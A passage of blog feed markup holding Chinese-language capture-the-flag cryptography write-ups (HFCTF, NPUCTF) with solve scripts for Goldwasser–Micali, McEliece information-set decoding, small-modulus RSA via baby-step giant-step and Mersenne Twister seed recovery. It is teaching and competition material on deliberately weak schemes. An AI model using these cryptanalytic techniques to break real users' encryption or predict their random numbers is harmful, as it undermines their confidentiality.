n1)</span><br><span class="line"></span><br><span class="line">PP.&lt;x&gt; = PolynomialRing(Zmod(p1))</span><br><span class="line">fp = x^<span class="number">5</span> - (m1_5 % p1)</span><br><span class="line">m1_p = fp.roots()</span><br><span class="line">PQ.&lt;y&gt; = PolynomialRing(Zmod(q1))</span><br><span class="line">fq = y^<span class="number">5</span> - (m1_5 % q1)</span><br><span class="line">m1_q = fq.roots()</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m1_p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m1_q:</span><br><span class="line">        tmp.append((i[<span class="number">0</span>], j[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (m1p, m1q) <span class="keyword">in</span> tmp:</span><br><span class="line">    print(long_to_bytes(crt([int(m1p), int(m1q)], [int(p1), int(q1)])))</span><br><span class="line"><span class="comment"># b'flag&#123;2a4d55342b46289d1f624d3083c5e2de&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(HFCTF) - Crypto</title>
      <link href="/2020/04/21/WriteUp-HFCTF-Crypto/"/>
      <url>/2020/04/21/WriteUp-HFCTF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="GM"><a href="#GM" class="headerlink" title="GM"></a>GM</h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>Goldwasser–Micali (GM) cryptosystem (Legendre符号)</li></ul><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="GM.zip">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>GM密钥生成：</p><p>生成大素数p,q，N=pq，再通过随机选择找到x，使得x是模p和模q的二次非剩余，则由Legendre定义知$(\frac{x}{p})=(\frac{x}{q})=-1$</p><p>公钥(x, N)，私钥(p, q)</p><p>GM加密：</p><p>明文二进制表示为$(m_{1},m_{2},…,m_{n})$</p><p>对每个$m_{i}$，生成随机值$y_{i}$，$c_{i}=y_{i}^{2}x^{y_{i}|m_{i}}\ mod\ N$</p><p>GM解密：</p><p>密文二进制表示为$(c_{1},x_{2},…,c_{n})$</p><p>对每个$c_{i}$，验证$(\frac{c_{i}}{p})$和$(\frac{c_{i}}{q})$，则由x为二次非剩余易得，勒让德符号均为1时$m_{i}=0$，均为-1时$m_{i}=1$</p><p>题目中泄露了$\varphi(N)$，因此相当于暴露私钥，直接解密即可</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">phi = ...</span><br><span class="line">n = ...</span><br><span class="line">sum = n + <span class="number">1</span> - phi</span><br><span class="line">delta = (sum**<span class="number">2</span>) - <span class="number">4</span> * n</span><br><span class="line">sqrt_delta = int(iroot(delta, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = (sum + sqrt_delta) // <span class="number">2</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">if</span> pow(i, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> pow(i, (q - <span class="number">1</span>) // <span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">'1'</span></span><br><span class="line">print(long_to_bytes(int(flag, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure><h3 id="mceliece"><a href="#mceliece" class="headerlink" title="mceliece"></a>mceliece</h3><p>比赛期间找到的paper有点杂，再加上Goppa码看得云里雾里，于是结束前三四个小时就去摸鱼了- -赛后填了下坑，在此做下记录</p><h4 id="题目考点-1"><a href="#题目考点-1" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>Information-set decoding</li></ul><h4 id="题目文件-1"><a href="#题目文件-1" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="mceliece.zip">Click Here to Download</a></p><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Goppa码</strong>：(具体纠错原理这里不费篇幅写，因为和本题涉及攻击方法基本无关联)</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_16-02-18.png" alt></p><p>可以用[n, k, d]线性码来描述Goppa码，满足维度$k\geq n-mt$，最小汉明重量$d\geq t+1$</p><p>其对应generator matrix为$k\times n$，且rank(G)=k，满足$GH^{T}=0(H^{T}为校验矩阵)$</p><p>最多能纠正t个错误</p><p><strong>The McEliece cryptosystem</strong>：</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_18-04-33.png" alt></p><p>$G’=SGP$（S是随机生成的$k\times k$可逆矩阵，G是Goppa码的$k\times n$生成矩阵，P是随机的$n\times n$排列矩阵(即每行/每列上仅有一个1，其他均为0)）</p><p>公钥为$(G’,k,n)$，私钥为$(S,G,P)$及Goppa码的g等</p><p>$GF(2)$上的McEliece二进制分组长度为k，加密时$c=mG’,y=c+e$，y作为密文发送</p><p>攻击者主要有以下两种攻击途径：</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_18-07-49.png" alt></p><p>这里不介绍第一种结构攻击，重点在第二种借助Information Set的攻击方法</p><p>设I为$\{1,…,n\}$的一k元子集，则$G_{I}$定义为：以I作列索引，从G’中得到的$k\times k$子矩阵，如果$G_{I}$可逆，则I满足Information Set定义</p><p>Information-set decoding一般形式下，要求输入</p><ul><li>$F_{q}^{n}$下的向量y(即McEliece系统的密文，与c的汉明距离为w)</li><li>$k\times n$矩阵G’</li></ul><p>则令I为Information Set，以其作为列索引得到$y_{I},G_{I}$，计算$y_{I}G_{I}^{-1}G’(1\times n)$，即认为其等于c或是c的一个近似估计</p><p><strong>[Lee–Brickell’s algorithm]</strong></p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_20-03-07.png" alt></p><p>$g_{a}$表示$G_{I}^{-1}G’$中a索引的列上唯一的1所在的行向量（由定义易知该列上仅有1个1，其他均为零元）</p><p>Step 1中Information-set作列索引对应的$y_{I}$，如果k个元素均无误差，则$y_{I}G_{I}^{-1}G’$能直接恢复出c（这一点很好证明），但k个元素中存在误差元时，要进行Step 3的汉明变换（$p_{max}=w$，但一般p不取$p_{max}$，尽管取$p_{max}$能保证任意Information-set都能在Step 3得到正确的e，但p过大会使得Step 3中的(A, m)组合过多，适宜即可）</p><p>下图为$p=p_{max}=w$时的运行截图</p><p><img src= "/img/loading.gif" data-src="/2020/04/21/WriteUp-HFCTF-Crypto/Snipaste_2020-04-28_22-38-03.png" alt></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = load(<span class="string">"cipher.sobj"</span>)</span><br><span class="line">pubkey = load(<span class="string">"pubkey.sobj"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lee_Brickell</span><span class="params">(y, G, Fq, w, p_max)</span>:</span></span><br><span class="line">    n, k = G.ncols(), G.nrows()</span><br><span class="line">    <span class="comment">#cnt = 0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># step 1</span></span><br><span class="line">        I = sample(range(n), k) <span class="comment"># Information Set</span></span><br><span class="line">        G_I = G.matrix_from_columns(I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> G_I.is_invertible():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        invG_I = G_I.inverse()</span><br><span class="line">        y_I = y.matrix_from_columns(I)</span><br><span class="line">        <span class="comment"># step 2</span></span><br><span class="line">        e_base = y - y_I * invG_I * G <span class="comment"># e which may be inaccurate</span></span><br><span class="line">        <span class="comment"># step 3</span></span><br><span class="line">        g = (invG_I * G).rows()</span><br><span class="line">        <span class="comment">#cnt += 1</span></span><br><span class="line">        <span class="comment">#print(cnt)</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(p_max + <span class="number">1</span>): <span class="comment"># size-p subset</span></span><br><span class="line">            <span class="keyword">for</span> A <span class="keyword">in</span> itertools.combinations(range(k), p):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> itertools.product(Fq.list()[<span class="number">1</span>:], repeat=p):</span><br><span class="line">                    e = e_base[<span class="number">0</span>] - sum(m[i] * g[A[i]] <span class="keyword">for</span> i <span class="keyword">in</span> range(p))</span><br><span class="line">                    <span class="keyword">if</span> e.hamming_weight() == w:</span><br><span class="line">                        <span class="keyword">return</span> e</span><br><span class="line">                    </span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> cipher:</span><br><span class="line">    e = Lee_Brickell(y, pubkey, F2, <span class="number">6</span>, <span class="number">2</span>)</span><br><span class="line">    c = y - Matrix(e) <span class="comment"># m * pubkey == c</span></span><br><span class="line">    m = pubkey.solve_left(c)</span><br><span class="line">    flag += <span class="string">""</span>.join([str(i) <span class="keyword">for</span> i <span class="keyword">in</span> m[<span class="number">0</span>]])</span><br><span class="line">flag += <span class="string">"0"</span> * (<span class="number">8</span> - len(flag) % <span class="number">8</span>)</span><br><span class="line">long_to_bytes(int(flag, <span class="number">2</span>))</span><br><span class="line"><span class="comment"># b'flag&#123;c941a3cc-85e3-4401-a0f1-764206e71bf3&#125;\x00\x00\x00\x00'</span></span><br></pre></td></tr></table></figure><h4 id="Ref"><a href="#Ref" class="headerlink" title="[Ref]"></a>[Ref]</h4><p><a href="information-set-decoding.pdf">information-set-decoding.pdf</a></p><p><a href="Goppa Codes and Their Use in the McEliece Cryptosystems.pdf">Goppa Codes and Their Use in the McEliece Cryptosystems.pdf</a></p><h3 id="pell"><a href="#pell" class="headerlink" title="pell"></a>pell</h3><h4 id="题目考点-2"><a href="#题目考点-2" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>pell方程递推式</li></ul><h4 id="题目文件-2"><a href="#题目文件-2" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="pell.zip">Click Here to Download</a></p><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>只考个pell方程递推式而已…</p><p><a href="https://blog.csdn.net/Herishwater/article/details/95640981?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4" target="_blank" rel="noopener">https://blog.csdn.net/Herishwater/article/details/95640981?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-4</a></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><p>未记录</p><p>记得交互时加sleep，靶机用的socket，直接发或者延时太长发都会出错</p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>cry2看paper的时候没抓到重点…如果比赛后期不去摸鱼的话指不定还能拿下这题，wtcl</p><p>最后高校组rank27，前20进线下（自闭</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Information Set </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(NPUCTF) - Crypto</title>
      <link href="/2020/04/19/WriteUp-NPUCTF-Crypto/"/>
      <url>/2020/04/19/WriteUp-NPUCTF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="认清形势，建立信心"><a href="#认清形势，建立信心" class="headerlink" title="认清形势，建立信心"></a>认清形势，建立信心</h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>DLP求解</li><li>CRT</li></ul><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="warm_up_683484967e8895fa6ba3db693e607491.zip.zip">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line"></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>$n|GCD(c_1^{2}-c_2,c_1^{3}-c_3)$，n易知</p><p>$e\in(0,n)$，即$size(e)\leq 50$，多种方法都能求解该数量级的DLP问题</p><p>这里采用BSGS，但直接对n用BSGS还是能到$O(2^{25})$，因此对p, q分别BSGS再CRT即可</p><p>本题的$m\%n$有多种情况，逐一判断即可</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">128509160179202</span></span><br><span class="line">c2 = <span class="number">518818742414340</span></span><br><span class="line">c3 = <span class="number">358553002064450</span></span><br><span class="line">n = GCD(c1**<span class="number">2</span>-c2, c1**<span class="number">3</span>-c3)</span><br><span class="line">n.factor() <span class="comment"># 2 * 18195301 * 28977097</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">n //= <span class="number">2</span></span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(g, y, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = int(ceil(sqrt(p - <span class="number">1</span>)))</span><br><span class="line">    S = &#123;pow(g, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    gs = pow(g, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[y])</span><br><span class="line">        y = y * gs % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c1_p = c1 % p</span><br><span class="line">c1_q = c1 % q</span><br><span class="line">e_1 = bsgs(<span class="number">2</span>, c1_p, p)</span><br><span class="line">e_2 = bsgs(<span class="number">2</span>, c1_q, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e_n = [] <span class="comment"># e % phi</span></span><br><span class="line"><span class="keyword">for</span> e_p <span class="keyword">in</span> e_1:</span><br><span class="line">    <span class="keyword">for</span> e_q <span class="keyword">in</span> e_2:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e_n.append(crt([e_p, e_q], [p - <span class="number">1</span>, q - <span class="number">1</span>])) <span class="comment"># e % phi</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">d_n = [inverse(e, phi) <span class="keyword">for</span> e <span class="keyword">in</span> e_n]</span><br><span class="line"></span><br><span class="line">m_n = set()</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_n:</span><br><span class="line">    m_n.add(pow(c, d, n))</span><br><span class="line">m_n = list(m_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> m_n:</span><br><span class="line">    print(<span class="string">b'npuctf&#123;'</span> + long_to_bytes(m) + <span class="string">b'&#125;'</span>)</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>签到题…结果没注意加密源码里m的strip，以为$m&gt;&gt;n$，所以其实已经解出来了还楞了好久…</p><h3 id="Mersenne-twister"><a href="#Mersenne-twister" class="headerlink" title="Mersenne_twister"></a>Mersenne_twister</h3><h4 id="题目考点-1"><a href="#题目考点-1" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>MT逆算法</li></ul><h4 id="题目文件-1"><a href="#题目文件-1" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="Mersenne_twister.zip">Click Here to Download</a></p><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">26</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">'npuctf&#123;'</span></span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line">...</span><br><span class="line">flag = flag.encode()</span><br><span class="line">random = mt73991(seed)</span><br><span class="line">f = open(<span class="string">'./cipher.txt'</span> , <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">    cipher = encrypt(key , chr(i).encode())</span><br><span class="line">    f.write(cipher)</span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>kpa逆encrypt函数，可得<code>mt_output[0]~mt_output[27],mt_output[100]~mt_output[103]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">    tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">    tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">    tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><p>从mt_output[i]恢复出state[i]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">    self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">    self.flag = <span class="number">0</span></span><br><span class="line">    self.srand()</span><br><span class="line">    self.generate()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">        self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">        self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">        y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">        temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">        temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">        <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">            temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">        self.state[i] = temp</span><br></pre></td></tr></table></figure><p>但这里得到的state是generate一轮后的state，所以要逆出至少一个old_state</p><p>发现<code>state[103]</code>和<code>state[0]</code>已知，且与<code>old_state[103]</code>和<code>old_state[104]</code>存在等式关系（<code>old_state[104]</code>能用<code>state[103]</code>表示）</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-20_00-22-17.png" alt></p><p>但s104可能存在两种可能(In [26])，因此在In [28]中进行一次判断，本题中为唯一解</p><p>得到s104后逆srand函数即可得到seed</p><p>(<code>&amp;=0xffffffff</code>等价于<code>%=0x100000000</code>，因此<code>(state[i+1]+i)*inverse(1812433253, 0x100000000)</code>即可得到<code>(self.state[i] ^ (self.state[i] &gt;&gt; 27))</code>，进而得到<code>state[i]</code></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span 